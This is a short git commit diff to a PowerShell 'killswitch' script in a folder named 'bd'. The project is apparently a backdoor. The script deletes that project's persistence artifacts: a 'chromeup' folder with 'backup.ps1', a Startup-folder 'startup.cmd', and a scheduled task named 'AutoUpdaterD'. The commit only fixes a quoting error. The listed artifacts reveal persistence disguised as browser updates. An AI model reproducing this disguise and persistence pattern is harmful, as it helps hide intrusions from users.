8ce26fa627e6dbcec91557490493b0489ccf3fc7
blousekool <132397759+blousekool@users.noreply.github.com>
2024-01-10 15:54:39 +0100

    Update killswitch.ps1

--- bd/killswitch.ps1
+++ bd/killswitch.ps1
@@ -11,7 +11,7 @@ Remove-Item $env:temp\username.json
 
 Remove-Item $env:appdata\chromeup\backup.ps1 -Force
 Remove-Item $env:appdata\chromeup -Recurse -Force
-Remove-Item '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd
+Remove-Item $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd
 
 
 Unregister-ScheduledTask -TaskName "AutoUpdaterD" -Confirm:$false
